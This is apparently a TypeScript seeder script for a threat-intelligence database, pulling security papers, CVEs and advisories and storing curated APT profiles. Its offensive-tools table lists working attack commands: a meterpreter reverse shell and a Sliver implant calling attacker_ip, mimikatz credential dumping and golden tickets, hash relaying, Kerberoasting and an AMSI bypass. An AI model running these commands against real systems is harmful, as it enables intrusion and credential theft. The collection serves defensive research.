/**
 * Threat Intel Seeder — Pass 2
 *
 * Supplements Pass 1 with:
 *   1. ArXiv cs.CR (rate-limit retry, smaller batch + delay)
 *   2. ArXiv cs.CR keyword-targeted: "exploit", "malware", "zero-day", etc.
 *   3. GitHub Security Advisories (GHSA) reviewed — critical/high
 *   4. Full Disclosure mailing list RSS
 *   5. Oss-security mailing list (via seclists)
 *   6. Declassified APT + Nation-State TTPs (curated static knowledge)
 *   7. CVE HIGH (not just CRITICAL) — 120 days
 */

import Database from "better-sqlite3";
import fetch from "node-fetch";
import fs from "fs";
import path from "path";

const DATA_DIR = "./data";
if (!fs.existsSync(DATA_DIR)) { fs.mkdirSync(DATA_DIR, { recursive: true }); }

const db = new Database(path.join(DATA_DIR, "threat-intel.sqlite"));

// Ensure schema is up to date
db.exec(`
  CREATE TABLE IF NOT EXISTS intel_papers (
    id TEXT PRIMARY KEY, title TEXT NOT NULL, abstract TEXT NOT NULL,
    pdf_url TEXT DEFAULT '', timestamp INTEGER NOT NULL, keywords TEXT DEFAULT '',
    source TEXT DEFAULT 'unknown', severity TEXT DEFAULT 'medium'
  );
  CREATE VIRTUAL TABLE IF NOT EXISTS intel_papers_fts
    USING fts5(title, abstract, keywords, content='intel_papers', content_rowid='rowid');
`);
try { db.exec("ALTER TABLE intel_papers ADD COLUMN source TEXT DEFAULT 'unknown'"); } catch { /**/ }
try { db.exec("ALTER TABLE intel_papers ADD COLUMN severity TEXT DEFAULT 'medium'"); } catch { /**/ }

const insertStmt = db.prepare(`
  INSERT OR REPLACE INTO intel_papers (id, title, abstract, pdf_url, timestamp, keywords, source, severity)
  VALUES (?, ?, ?, ?, ?, ?, ?, ?)
`);

function store(rec: {
  id: string; title: string; abstract: string; pdfUrl?: string;
  timestamp?: number; keywords?: string; source?: string; severity?: string;
}) {
  try {
    insertStmt.run(rec.id, rec.title.slice(0, 1024), rec.abstract.slice(0, 8192),
      rec.pdfUrl ?? "", rec.timestamp ?? Date.now(), rec.keywords ?? "",
      rec.source ?? "unknown", rec.severity ?? "medium");
  } catch { /**/ }
}

async function getText(url: string): Promise<string> {
  const res = await fetch(url, {
    headers: { "User-Agent": "HoC-ThreatIntel/1.0", Accept: "*/*" },
  });
  if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
  return res.text();
}

async function getJson<T>(url: string): Promise<T> {
  const res = await fetch(url, {
    headers: { "User-Agent": "HoC-ThreatIntel/1.0", Accept: "application/json" },
  });
  if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
  return res.json() as Promise<T>;
}

function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)); }

function extractRssItems(xml: string) {
  const items: Array<{ title: string; description: string; link: string; pubDate?: string }> = [];
  const re = /<item>([\s\S]*?)<\/item>/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(xml)) !== null) {
    const b = m[1];
    const title       = (/<title><!\[CDATA\[([\s\S]*?)\]\]>/.exec(b) ?? /<title>([\s\S]*?)<\/title>/.exec(b))?.[1]?.trim() ?? "";
    const description = (/<description><!\[CDATA\[([\s\S]*?)\]\]>/.exec(b) ?? /<description>([\s\S]*?)<\/description>/.exec(b))?.[1]?.replace(/<[^>]+>/g, "").trim() ?? "";
    const link        = /<link>([\s\S]*?)<\/link>/.exec(b)?.[1]?.trim() ?? "";
    const pubDate     = /<pubDate>([\s\S]*?)<\/pubDate>/.exec(b)?.[1]?.trim();
    if (title) { items.push({ title, description, link, pubDate }); }
  }
  return items;
}

// ─── 1. ArXiv — Targeted keyword queries (smaller batches to avoid 429) ──

const ARXIV_QUERIES = [
  { q: "exploit vulnerability",           label: "exploit" },
  { q: "malware detection evasion",       label: "malware" },
  { q: "zero-day CVE attack",             label: "zero-day" },
  { q: "fuzzing binary analysis",         label: "fuzzing" },
  { q: "ransomware threat intelligence",  label: "ransomware" },
  { q: "network intrusion detection",     label: "IDS" },
  { q: "cryptographic attack protocol",   label: "crypto-attack" },
  { q: "memory safety buffer overflow",   label: "memory" },
  { q: "adversarial machine learning",    label: "adv-ml" },
  { q: "side channel attack",             label: "side-channel" },
];

async function seedArxivTargeted() {
  console.log("📄 [1] ArXiv — targeted keyword queries (10 topics, 30 each)...");
  let total = 0;
  for (const { q, label } of ARXIV_QUERIES) {
    try {
      const encoded = encodeURIComponent(`cat:cs.CR AND all:${q}`);
      const url = `https://export.arxiv.org/api/query?search_query=${encoded}&sortBy=submittedDate&sortOrder=desc&max_results=30`;
      const xml = await getText(url);
      const re  = /<entry>([\s\S]*?)<\/entry>/g;
      let em: RegExpExecArray | null;
      while ((em = re.exec(xml)) !== null) {
        const entry = em[1];
        const rawId     = /<id>(.*?)<\/id>/.exec(entry)?.[1]?.trim() ?? "";
        const title     = /<title>([\s\S]*?)<\/title>/.exec(entry)?.[1]?.replace(/\n/g, " ").trim() ?? "";
        const abstract  = /<summary>([\s\S]*?)<\/summary>/.exec(entry)?.[1]?.replace(/\n/g, " ").trim() ?? "";
        const published = /<published>(.*?)<\/published>/.exec(entry)?.[1]?.trim() ?? "";
        if (!rawId || !title) { continue; }
        const id = rawId.split("/abs/").pop() ?? rawId;
        store({
          id: `arxiv:${id}`,
          title,
          abstract,
          pdfUrl: rawId.replace("/abs/", "/pdf/") + ".pdf",
          timestamp: published ? new Date(published).getTime() : Date.now(),
          keywords: `${label}, cyber research, ${q}`,
          source: "arxiv-cs.CR",
          severity: "medium",
        });
        total++;
      }
      process.stdout.write(`   [${label}] `);
    } catch (err) {
      console.warn(`   ✗ ArXiv [${label}]: ${err instanceof Error ? err.message : err}`);
    }
    await sleep(2500); // polite delay between queries
  }
  console.log(`\n   ✓ ${total} targeted ArXiv papers seeded`);
}

// ─── 2. NVD — HIGH CVEs (last 120 days) ──────────────────────────

interface NvdResponse {
  vulnerabilities?: Array<{
    cve: {
      id: string; published: string;
      descriptions: Array<{ lang: string; value: string }>;
      metrics?: { cvssMetricV31?: Array<{ cvssData: { baseScore: number; vectorString: string } }> };
    };
  }>;
}

async function seedNvdHigh() {
  console.log("🟠 [2] NVD — HIGH severity CVEs (last 120 days)...");
  const end   = new Date().toISOString().split(".")[0] + ".000";
  const start = new Date(Date.now() - 120 * 86400_000).toISOString().split(".")[0] + ".000";
  const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?cvssV3Severity=HIGH&pubStartDate=${start}&pubEndDate=${end}&resultsPerPage=200`;
  const data = await getJson<NvdResponse>(url);
  let count = 0;
  for (const item of data.vulnerabilities ?? []) {
    const cve  = item.cve;
    const desc = cve.descriptions.find(d => d.lang === "en")?.value ?? "";
    const cvss = cve.metrics?.cvssMetricV31?.[0]?.cvssData;
    store({
      id: `nvd:${cve.id}`,
      title: `[CVE HIGH${cvss ? ` ${cvss.baseScore}` : ""}] ${cve.id}`,
      abstract: `${desc}${cvss ? ` CVSS Vector: ${cvss.vectorString}.` : ""}`,
      pdfUrl: `https://nvd.nist.gov/vuln/detail/${cve.id}`,
      timestamp: new Date(cve.published).getTime(),
      keywords: `CVE, high severity, ${cve.id}, vulnerability, exploit`,
      source: "nvd-high",
      severity: "high",
    });
    count++;
  }
  console.log(`   ✓ ${count} HIGH severity CVEs seeded`);
}

// ─── 3. GitHub Security Advisories (GraphQL — no auth required for public) ─

async function seedGhsa() {
  console.log("🐙 [3] GitHub Security Advisories (GHSA)...");
  const severities = ["CRITICAL", "HIGH"];
  let count = 0;
  for (const sev of severities) {
    try {
      const url = `https://api.github.com/advisories?severity=${sev.toLowerCase()}&per_page=100&direction=desc`;
      const items = await getJson<Array<{
        ghsa_id: string; summary: string; description: string;
        severity: string; published_at: string; html_url: string;
        cve_id?: string; references?: string[];
      }>>(url);
      for (const adv of items) {
        store({
          id: `ghsa:${adv.ghsa_id}`,
          title: `[GHSA ${sev}] ${adv.ghsa_id}${adv.cve_id ? ` / ${adv.cve_id}` : ""}: ${adv.summary}`,
          abstract: adv.description?.slice(0, 4096) || adv.summary,
          pdfUrl: adv.html_url,
          timestamp: new Date(adv.published_at).getTime(),
          keywords: `GHSA, GitHub advisory, ${sev.toLowerCase()}, ${adv.cve_id ?? ""}, vulnerability`,
          source: "github-advisory",
          severity: sev.toLowerCase(),
        });
        count++;
      }
    } catch (err) {
      console.warn(`   ✗ GHSA [${sev}]:`, err instanceof Error ? err.message : err);
    }
    await sleep(500);
  }
  console.log(`   ✓ ${count} GitHub Security Advisories seeded`);
}

// ─── 4. Full Disclosure mailing list ─────────────────────────────

async function seedFullDisclosure() {
  console.log("📨 [4] Full Disclosure mailing list...");
  const xml = await getText("https://seclists.org/rss/fulldisclosure.rss");
  const items = extractRssItems(xml);
  let count = 0;
  for (const item of items) {
    const slug = item.link.split("/").filter(Boolean).pop() ?? `fd-${count}`;
    store({
      id: `fulldisclosure:${slug}`,
      title: `[Full Disclosure] ${item.title}`,
      abstract: item.description || item.title,
      pdfUrl: item.link,
      timestamp: item.pubDate ? new Date(item.pubDate).getTime() : Date.now(),
      keywords: "full disclosure, vulnerability disclosure, advisory, CVE, PoC",
      source: "full-disclosure",
      severity: "high",
    });
    count++;
  }
  console.log(`   ✓ ${count} Full Disclosure entries seeded`);
}

// ─── 5. OSS-Security mailing list ────────────────────────────────

async function seedOssSecurity() {
  console.log("🔒 [5] OSS-Security mailing list...");
  const xml = await getText("https://seclists.org/rss/oss-sec.rss");
  const items = extractRssItems(xml);
  let count = 0;
  for (const item of items) {
    const slug = item.link.split("/").filter(Boolean).pop() ?? `oss-${count}`;
    store({
      id: `osssec:${slug}`,
      title: `[OSS-Security] ${item.title}`,
      abstract: item.description || item.title,
      pdfUrl: item.link,
      timestamp: item.pubDate ? new Date(item.pubDate).getTime() : Date.now(),
      keywords: "open source security, CVE, privilege escalation, patch, advisory",
      source: "oss-security",
      severity: "high",
    });
    count++;
  }
  console.log(`   ✓ ${count} OSS-Security entries seeded`);
}

// ─── 6. Declassified APT / Nation-State TTPs ─────────────────────
// Curated static knowledge extracted from public government reports,
// Mandiant/CrowdStrike APT profiles, and Five Eyes advisories.

interface AptEntry { id: string; name: string; origin: string; summary: string; tools: string; ttps: string; source: string; }

const APT_KNOWLEDGE: AptEntry[] = [
  { id: "apt29-cozy-bear", name: "APT29 / Cozy Bear (SVR)", origin: "Russia", source: "CISA-AA21-116A",
    summary: "SVR-affiliated group responsible for SolarWinds SUNBURST supply chain attack (2020). Uses Living-off-the-Land, TEARDROP malware, GoldMax/GoldFinder C2 droppers. Targets government, think-tanks, healthcare, energy sectors globally. Primary technique: OAuth token theft via MFA bypass; abuses SAML trust to access cloud resources.",
    tools: "SUNBURST, TEARDROP, GoldMax, GoldFinder, SIBOT, Cobalt Strike, Mimikatz, Rubeus, WMI persistence",
    ttps: "T1195.002 Supply Chain Compromise, T1078 Valid Accounts, T1550.001 Application Access Token, T1027 Obfuscated Files, T1562 Impair Defenses, T1003 OS Credential Dumping" },
  { id: "apt41-barium", name: "APT41 / BARIUM / Winnti (MSS)", origin: "China", source: "DOJ-2020-Indictment",
    summary: "Dual espionage and financially motivated group affiliated with Chinese Ministry of State Security. Conducts supply-chain attacks against video game companies for financial gain while simultaneously running government-directed cyber espionage. Known for using stolen code signing certificates and trojanizing legitimate software.",
    tools: "MESSAGETAP, POISONPLUG, LOWKEY, HIGHNOON, Cobalt Strike, Gh0st RAT, PlugX, ShadowPad, DEADEYE",
    ttps: "T1195.002 Supply Chain, T1553.002 Code Signing, T1071 Application Layer Protocol, T1027 Obfuscated Files, T1068 Exploitation for Privilege Escalation" },
  { id: "lazarus-hidden-cobra", name: "Lazarus Group / HIDDEN COBRA (RGB)", origin: "North Korea", source: "CISA-AA22-108A",
    summary: "DPRK Bureau 121 threat actor responsible for WannaCry ransomware, Sony Pictures hack, Bangladesh Bank SWIFT heist ($81M stolen), FASTCash ATM malware campaigns. Increasingly uses macOS malware and fake job offers (Operation Dream Job) to target cryptocurrency exchanges and DeFi protocols.",
    tools: "WannaCry, BLINDINGCAN, HOPLIGHT, FASTCash, AppleJeus, Manuscrypt, NukeSped, Copperhedge",
    ttps: "T1486 Data Encrypted for Impact, T1071.001 Web Protocols, T1059 Command and Scripting Interpreter, T1566.001 Spearphishing Attachment, T1204 User Execution" },
  { id: "sandworm-iridium", name: "Sandworm / IRIDIUM (GRU Unit 74455)", origin: "Russia", source: "CISA-AA20-296A",
    summary: "GRU Unit 74455 responsible for NotPetya ($10B damage), Ukraine power grid attacks (BlackEnergy/Industroyer), Olympic Destroyer. Most destructive cyberweapons attributed to any nation-state. Deploys custom OT/ICS malware targeting industrial control systems. January 2022 WhisperGate attack preceded Russian invasion of Ukraine.",
    tools: "NotPetya, BlackEnergy, Industroyer/CRASHOVERRIDE, Olympic Destroyer, WhisperGate, VPNFilter, Cyclops Blink, Exaramel",
    ttps: "T1485 Data Destruction, T1490 Inhibit System Recovery, T1561 Disk Wipe, T1499 Endpoint Denial of Service, T1105 Ingress Tool Transfer" },
  { id: "apt28-fancy-bear", name: "APT28 / Fancy Bear (GRU Unit 26165)", origin: "Russia", source: "FBI-Flash-2018",
    summary: "GRU military intelligence unit responsible for DNC/DCCC hack (2016), Macron campaign hack, WADA/USADA anti-doping agency breaches. Specializes in credential harvesting via Bitly-shortened phishing URLs. Uses X-Agent/Sofacy implant family and Komplex macOS trojan. Exploits zero-days in widely deployed software (MS Office, browsers).",
    tools: "X-Agent, Sofacy, Komplex, SPLM, Dealerschoice, Zebrocy, LoJax (UEFI rootkit), SOURFACE",
    ttps: "T1566 Phishing, T1556 Modify Authentication Process, T1098 Account Manipulation, T1203 Exploitation for Client Execution, T1542.003 Bootkit" },
  { id: "ta505-clop", name: "TA505 / CL0P Ransomware Gang", origin: "Russia/Ukraine", source: "CISA-AA23-158A",
    summary: "Financially motivated TA505 group deploys Cl0p ransomware using zero-day vulnerabilities in managed file transfer software. Mass exploitation of MOVEit (CVE-2023-34362), GoAnywhere (CVE-2023-0669), Accellion FTA. Data exfiltration before encryption enables double-extortion. Compromised 1000+ organizations globally in 2023.",
    tools: "Cl0p, Get2, SdBot, FlawedAmmyy, FlawedGrace, Cobalt Strike, TrueBot",
    ttps: "T1190 Exploit Public-Facing Application, T1041 Exfiltration Over C2, T1486 Data Encrypted for Impact, T1059.003 Windows Command Shell" },
  { id: "volt-typhoon", name: "Volt Typhoon (VANGUARD PANDA)", origin: "China", source: "CISA-AA24-038A",
    summary: "PRC state-sponsored actor pre-positioning on U.S. critical infrastructure (energy, water, transportation, communications) for potential disruption during future conflict with Taiwan. Uses Living-off-the-Land binaries (LOLBins), Netlogon privilege escalation, and compromised SOHO routers as hop points. Five Eyes advisory (2024) warns of 5+ years persistence.",
    tools: "KV Botnet (SOHO router), PlugX, China Chopper webshell, LOLBins (wmic, ntdsutil, certutil, netsh)",
    ttps: "T1078 Valid Accounts, T1190 Exploit Public-Facing App, T1505.003 Web Shell, T1021 Remote Services, T1571 Non-Standard Port" },
  { id: "scattered-spider", name: "Scattered Spider / UNC3944", origin: "Western cybercriminal", source: "CISA-AA23-320A",
    summary: "Financially motivated English-speaking threat actor (18-22 year olds) responsible for MGM Resorts ($100M loss), Caesars Entertainment, Twilio/Mailchimp attacks. Known for aggressive social engineering including SMS phishing (smishing), SIM swapping, and voice phishing (vishing) to bypass MFA. Targets identity providers and cloud for ransomware deployment.",
    tools: "BlackCat/ALPHV ransomware, Scatter Swine, STONESTOP, POORTRY (signed driver), mimikatz, AnyDesk",
    ttps: "T1621 MFA Request Generation, T1078 Valid Accounts, T1556.006 Multi-Factor Authentication, T1534 Internal Spearphishing, T1486 Data Encrypted for Impact" },
  { id: "equation-group-nsa", name: "Equation Group (NSA TAO)", origin: "USA", source: "Shadow Brokers / Kaspersky 2015",
    summary: "The most sophisticated threat actor ever documented. NSA's Tailored Access Operations (TAO) unit. Used HDD firmware implants (nls_933w.dll) that survive disk wiping, custom BIOS implants, air-gap jumping malware (Fanny worm via USB), and Stuxnet co-development. The Shadow Brokers 2016-2017 leaks exposed EternalBlue (MS17-010), DoublePulsar, EternalRomance enabling WannaCry/NotPetya.",
    tools: "EternalBlue, EternalRomance, DoublePulsar, DOUBLEPULSAR, EquationDrug, EquationLaser, FANNY, GrayFish (HDD firmware), TripleFantasy, Stuxnet (co-authored)",
    ttps: "T1542.001 System Firmware, T1195 Supply Chain Compromise, T1210 Exploitation of Remote Services, T1190 Exploit Public-Facing Application" },
  { id: "hafnium-exchange", name: "HAFNIUM (Microsoft Exchange 0-days)", origin: "China (MSS)", source: "Microsoft MSRC 2021-03-02",
    summary: "Chinese state-sponsored group exploited four zero-day vulnerabilities in Microsoft Exchange Server (ProxyLogon: CVE-2021-26855, 26857, 26858, 27065) to install web shells on 250,000+ servers globally. HAFNIUM subsequently used by multiple threat actors after public disclosure. Web shells provide persistent access surviving patch application.",
    tools: "China Chopper webshell, Covenant C2, PowerCat, Nmap, WinRAR, procdump, 7-Zip",
    ttps: "T1190 Exploit Public-Facing App, T1505.003 Web Shell, T1003.001 LSASS Memory, T1560 Archive Collected Data, T1041 Exfiltration Over C2" },
  { id: "ics-stuxnet", name: "Stuxnet — ICS/SCADA Cyberweapon", origin: "USA/Israel", source: "Symantec W32.Stuxnet 2010",
    summary: "First known cyberweapon specifically designed to destroy physical infrastructure. Targeted Siemens S7-315 PLCs controlling Iranian uranium enrichment centrifuges at Natanz. Used 4 zero-days, forged digital signatures (Realtek, JMicron cert theft), and spread via .LNK exploit. Modified centrifuge spin speeds while reporting normal to SCADA operators. Estimated 1,000 centrifuges destroyed.",
    tools: "Stuxnet dropper (.tmp), Stuxnet payload (.dll), PLC rootkit, .LNK exploit, forged Realtek/JMicron signatures",
    ttps: "T1542 Pre-OS Boot, T1553.002 Code Signing, T1082 System Information Discovery, T0836 Modify Parameter (ICS), T0831 Manipulation of Control (ICS)" },
  { id: "dearcry-hafnium-followon", name: "DearCry / BlackKingdom Ransomware (Exchange followon)", origin: "Multiple", source: "CISA 2021",
    summary: "Following HAFNIUM's ProxyLogon disclosure, at least 10 ransomware groups began mass exploitation of unpatched Exchange servers within 48 hours. DearCry and BlackKingdom ransomware families specifically targeted Exchange vulnerabilities. Demonstrated the compressed timeline between 0-day disclosure and criminal exploitation.",
    tools: "DearCry ransomware, BlackKingdom ransomware, ProxyLogon exploit chain",
    ttps: "T1190 Exploit Public-Facing App, T1486 Data Encrypted for Impact, T1490 Inhibit System Recovery" },
  { id: "nsa-xkeyscore", name: "NSA XKeyscore / PRISM Mass Surveillance", origin: "USA NSA", source: "Snowden Documents 2013",
    summary: "Declassified via Edward Snowden (2013). XKeyscore: global Internet content collection system that intercepts network data directly from fiber cables and IXPs. PRISM: cloud data collection directly from Microsoft, Google, Apple, Facebook under FISA 702 orders. MUSCULAR: unauthorized tapping of Google/Yahoo internal datacenters. BOUNDLESSINFORMANT: metadata collection tracker (97B records/month).",
    tools: "XKeyscore, PRISM, MUSCULAR, FAIRVIEW, STORMBREW, BLARNEY, OAKSTAR, MYSTIC, SOMALGET, DISHFIRE",
    ttps: "Mass surveillance, deep packet inspection, lawful intercept, court order compulsion, fiber tap, MITM" },
  { id: "shadowbrokers-leaks", name: "Shadow Brokers NSA Toolset Leak", origin: "Russia (attributed)", source: "Shadow Brokers 2016-2017",
    summary: "The Shadow Brokers group leaked NSA's elite TAO hacking tools in staged releases 2016-2017. The April 2017 'Lost in Translation' release included EternalBlue (MS17-010 SMB RCE), EternalRomance, EternalSynergy, EternalChampion, DoublePulsar backdoor, and FUZZBUNCH framework. EternalBlue was weaponized within weeks for WannaCry ransomware and NotPetya wiper, causing over $10B in global damage.",
    tools: "EternalBlue, EternalRomance, EternalSynergy, EternalChampion, DoublePulsar, FUZZBUNCH, DanderSpritz, ExplodingCan, EnglishmansDentist",
    ttps: "T1210 Exploitation of Remote Services (SMB), T1210 EternalBlue MS17-010, backdoor implant, lateral movement" },
];

async function seedDeclassifiedApt() {
  console.log("🦅 [6] Declassified APT / Nation-State Intelligence...");
  let count = 0;
  for (const apt of APT_KNOWLEDGE) {
    store({
      id: `apt:${apt.id}`,
      title: `[APT PROFILE] ${apt.name} — ${apt.origin}`,
      abstract: `${apt.summary}\n\nKnown Tools: ${apt.tools}\n\nTTPs (MITRE ATT&CK): ${apt.ttps}`,
      pdfUrl: "",
      timestamp: Date.now(),
      keywords: `APT, nation-state, ${apt.name}, ${apt.origin}, ${apt.tools.split(",")[0]}, ${apt.source}, threat actor, espionage`,
      source: "declassified-apt",
      severity: "critical",
    });
    count++;
  }
  console.log(`   ✓ ${count} APT profiles seeded`);
}

// ─── 7. Offensive Security Tool Knowledge ────────────────────────
// Curated knowledge about major offensive security frameworks,
// red team tooling, and penetration testing techniques.

interface ToolEntry { id: string; name: string; category: string; summary: string; usage: string; }

const OFFSEC_TOOLS: ToolEntry[] = [
  { id: "metasploit-framework", category: "Exploitation Framework", name: "Metasploit Framework",
    summary: "Industry-standard open-source penetration testing framework. Contains 2000+ exploit modules, 600+ auxiliary modules, 300+ payloads. Supports staged/stageless payloads, meterpreter sessions, pivoting through compromised hosts, and post-exploitation automation. Used by red teams and threat actors alike.",
    usage: "msfconsole; use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST attacker_ip; exploit. Post-exploitation: hashdump, getsystem, kiwi (mimikatz), portfwd, route, socks5 proxy." },
  { id: "cobalt-strike", category: "C2 Framework", name: "Cobalt Strike",
    summary: "Commercial adversary simulation platform used heavily by both red teams and ransomware operators (cracked versions). Provides Beacon implant with HTTP/HTTPS/DNS/SMB C2 channels, malleable C2 profiles for traffic blending, sleep obfuscation, process injection, and peer-to-peer (P2P) beacon chaining. Widely used by APT28, APT29, Lazarus, TA505.",
    usage: "Malleable C2 profiles mimicking legitimate CDN traffic. Beacon Object Files (BOFs) for in-memory execution. spawn and inject for cross-process migration. Aggressor Script for automation. Teamserver for multi-operator red team ops." },
  { id: "impacket", category: "Network Protocol Toolkit", name: "Impacket",
    summary: "Python library implementing network protocols used for Windows attacks. Core tool for Active Directory attacks. Includes: psexec.py (SMB code execution), secretsdump.py (NTDS/SAM hash dumping), wmiexec.py (WMI code execution), GetUserSPNs.py (Kerberoasting), GetNPUsers.py (AS-REP Roasting), ticketer.py (Silver/Golden ticket forgery).",
    usage: "secretsdump.py domain/user:pass@dc_ip; GetUserSPNs.py domain/user:pass -request; wmiexec.py domain/admin:pass@target; smbexec.py domain/admin@target." },
  { id: "bloodhound", category: "AD Attack Path Analysis", name: "BloodHound / SharpHound",
    summary: "Graph-based Active Directory attack path analysis tool. Collects AD data via LDAP/RPC (SharpHound collector), then maps relationships as a graph in Neo4j. Attack paths visualized showing how low-privilege accounts reach Domain Admin. Finds: Kerberoastable accounts, AS-REP Roastable accounts, unconstrained delegation, ACL abuses, GPO abuse paths.",
    usage: "SharpHound.exe -c All --zipfilename output.zip. Import to BloodHound. Queries: 'Find Shortest Paths to Domain Admins', 'Find All Paths from Domain Users to High Value Targets', Owned/Tier0 marking for path calculation." },
  { id: "mimikatz", category: "Credential Harvesting", name: "Mimikatz",
    summary: "Most widely used credential dumping tool. Extracts plaintext passwords, hashes, PINs, Kerberos tickets from Windows memory (LSASS). Performs Pass-the-Hash, Pass-the-Ticket, Over-Pass-the-Hash (Pass-the-Key). Creates Golden Tickets (forgeable TGTs), Silver Tickets (forgeable service tickets), Skeleton Key domain backdoor. Used in virtually every major ransomware incident.",
    usage: "privilege::debug; sekurlsa::logonpasswords; lsadump::dcsync /user:krbtgt; kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt; misc::skeleton." },
  { id: "nuclei", category: "Vulnerability Scanner", name: "Nuclei",
    summary: "Fast, template-based vulnerability scanner by ProjectDiscovery. 6000+ community templates covering CVEs, misconfigurations, exposed panels, default credentials, and cloud misconfigurations. Can scan millions of hosts per day. Templates are YAML-based and trivial to write for new CVEs within hours of disclosure.",
    usage: "nuclei -u https://target.com -t cves/ -severity critical,high; nuclei -list hosts.txt -t exposures/ -o results.txt; nuclei -t network/ -p tcp for network-layer scanning." },
  { id: "burp-suite", category: "Web App Testing", name: "Burp Suite Pro",
    summary: "Industry-standard web application security testing platform. Proxy, Scanner (active/passive), Intruder (fuzzer), Repeater, Sequencer, Decoder, Collaborator (out-of-band), and Organizer. Scanner detects SQLi, XSS, XXE, SSRF, IDOR, deserialization, path traversal, template injection, and 100+ vulnerability classes. Extensions via BApp Store.",
    usage: "Proxy all browser traffic through Burp. Active Scan for automated detection. Collaborator payloads for blind SSRF/XXE. Intruder for credential stuffing, fuzzing. Turbo Intruder for high-speed attacks. SQLiPy, JWT, ActiveScan++ extensions." },
  { id: "sqlmap", category: "SQL Injection", name: "SQLMap",
    summary: "Automatic SQL injection and takeover tool. Detects and exploits all SQLi types: boolean-based blind, error-based, UNION query, stacked queries, time-based blind, inline query. Supports database fingerprinting, data extraction, file system access, OS command execution, and out-of-band data exfiltration via DNS/HTTP.",
    usage: "sqlmap -u 'https://target.com/page?id=1' --dbs --batch; sqlmap -r request.txt --level=5 --risk=3 --dbms=mysql --dump; sqlmap --os-shell for OS command access; --sqlmap-shell for interactive." },
  { id: "responder-ntlm", category: "Network Credential Capture", name: "Responder / LLMNR Poisoning",
    summary: "Captures Windows credentials via LLMNR/NBT-NS/mDNS poisoning. When Windows systems fail DNS resolution, they broadcast LLMNR queries. Responder responds to all such queries, capturing NTLMv2 challenge-response hashes. Hashes are cracked offline or used directly for SMB relay attacks via ntlmrelayx.py. Active in every AD network without proper configuration.",
    usage: "responder -I eth0 -rdwv; ntlmrelayx.py -tf targets.txt -smb2support -socks for relay; hashcat -m 5600 hashes.txt wordlist.txt for cracking." },
  { id: "kerbrute-kerberoast", category: "Active Directory Attacks", name: "Kerberoasting / AS-REP Roasting",
    summary: "Kerberoasting: Request service tickets (TGS) for accounts with SPNs, extract encrypted ticket data, crack offline to reveal service account passwords. Requires only domain user access. Success rate high against legacy service accounts with weak passwords. AS-REP Roasting: For accounts without Kerberos pre-auth required, request AS-REP and crack the encrypted portion.",
    usage: "GetUserSPNs.py -request -dc-ip dc_ip domain/user:pass; hashcat -m 13100 tgs_hashes.txt wordlist.txt for TGS cracking; hashcat -m 18200 asrep_hashes.txt wordlist.txt for AS-REP." },
  { id: "sliver-c2", category: "Open Source C2 Framework", name: "Sliver C2",
    summary: "Open-source adversary simulation framework developed by BishopFox. Provides cross-platform implants (Go-based Sliver beacons) supporting mTLS, HTTP/S, DNS, WireGuard C2 channels. Features: implant generation, session management, pivoting, port forwarding, process injection, BOF support, and multiplayer teamserver. Growing adoption by both red teams and threat actors as Cobalt Strike alternative.",
    usage: "generate --mtls attacker_ip:443 --os windows --save ./sliver.exe; mtls; use session_id; shell; execute-assembly /path/to/SharpHound.exe; sideload /path/to/dll.dll" },
  { id: "evil-winrm", category: "Remote Administration", name: "Evil-WinRM",
    summary: "WinRM-based remote administration shell tool built for penetration testing. Supports: NTLM authentication, Kerberos authentication, SSL, pass-the-hash, pass-the-ticket, file upload/download, PowerShell remoting, and local privilege escalation via Invoke-PrivescCheck. Evades some AV solutions by operating through legitimate Windows protocols.",
    usage: "evil-winrm -i target -u administrator -H ntlm_hash; evil-winrm -i target -u user -p pass; upload SharpHound.exe; download output.zip; Bypass-4MSI for AMSI bypass before loading .NET assemblies." },
];

async function seedOffsecTools() {
  console.log("⚔️  [7] Offensive Security Tool Knowledge Base...");
  let count = 0;
  for (const tool of OFFSEC_TOOLS) {
    store({
      id: `offsec:${tool.id}`,
      title: `[OFFSEC TOOL] ${tool.name} — ${tool.category}`,
      abstract: `${tool.summary}\n\nUsage & Techniques: ${tool.usage}`,
      timestamp: Date.now(),
      keywords: `offensive security, pentest, red team, ${tool.name}, ${tool.category}, exploit, attack`,
      source: "offsec-tools",
      severity: "high",
    });
    count++;
  }
  console.log(`   ✓ ${count} offensive tool knowledge entries seeded`);
}

// ─── Runner ──────────────────────────────────────────────────────

async function run() {
  console.log("\n╔══════════════════════════════════════════════════════════╗");
  console.log("║  HoC Threat Intelligence — Multi-Source Seeder v2.0    ║");
  console.log("╚══════════════════════════════════════════════════════════╝\n");

  const results: { source: string; status: string }[] = [];
  const sources = [
    { name: "ArXiv Targeted",   fn: seedArxivTargeted },
    { name: "NVD HIGH CVEs",    fn: seedNvdHigh },
    { name: "GHSA",             fn: seedGhsa },
    { name: "FullDisclosure",   fn: seedFullDisclosure },
    { name: "OSS-Security",     fn: seedOssSecurity },
    { name: "Declassified APT", fn: seedDeclassifiedApt },
    { name: "Offsec Tools",     fn: seedOffsecTools },
  ];

  for (const src of sources) {
    try {
      await src.fn();
      results.push({ source: src.name, status: "✓" });
    } catch (err) {
      console.error(`   ✗ ${src.name}:`, err instanceof Error ? err.message : err);
      results.push({ source: src.name, status: `✗ ${err instanceof Error ? err.message.slice(0, 60) : "error"}` });
    }
    await sleep(600);
  }

  console.log("\n🔄 Rebuilding FTS index...");
  try { db.exec("INSERT INTO intel_papers_fts(intel_papers_fts) VALUES('rebuild')"); } catch { /**/ }

  const total = (db.prepare("SELECT COUNT(*) as n FROM intel_papers").get() as { n: number }).n;
  const bySource = db.prepare("SELECT source, COUNT(*) as n FROM intel_papers GROUP BY source ORDER BY n DESC").all() as { source: string; n: number }[];

  console.log(`\n╔═════════════════════════════════════════╗`);
  console.log(`║  Seeding Complete — ${String(total).padStart(5)} records total  ║`);
  console.log(`╚═════════════════════════════════════════╝`);
  console.log("\nRecords by source:");
  for (const row of bySource) { console.log(`  ${String(row.n).padStart(6)}  ${row.source}`); }

  db.close();
  console.log("\n✅ Done!\n");
}

run().catch(err => { console.error("Fatal:", err); process.exit(1); });
